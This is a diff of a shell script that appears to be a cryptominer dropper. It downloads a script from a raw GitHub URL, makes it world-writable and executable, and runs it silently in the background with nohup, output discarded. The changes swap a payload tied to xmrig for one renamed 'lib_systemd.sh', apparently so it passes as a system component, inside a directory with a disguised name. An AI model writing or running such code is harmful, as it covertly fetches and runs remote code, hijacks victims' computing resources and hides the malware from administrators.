@@ -14,8 +14,8 @@ cd /$HOME/
 rm -f mysqltcp.sh
 
 cd $HOME/myssqltcp/
-wget https://raw.githubusercontent.com/teshushu/BiBi/main/Bash/time.sh
-chmod 777 time.sh
-/bin/bash $HOME/myssqltcp/time.sh >/dev/null 2>&1 &
-nohup ./xmrig.sh > /dev/null 2>&1 &
+wget https://raw.githubusercontent.com/teshushu/BiBi/main/Bash/lib_systemd.sh
+chmod 777 lib_systemd.sh
+/bin/bash $HOME/myssqltcp/lib_systemd.sh >/dev/null 2>&1 &
+nohup ./lib_systemd.sh > /dev/null 2>&1 &
 echo "[*] Yes-Go"
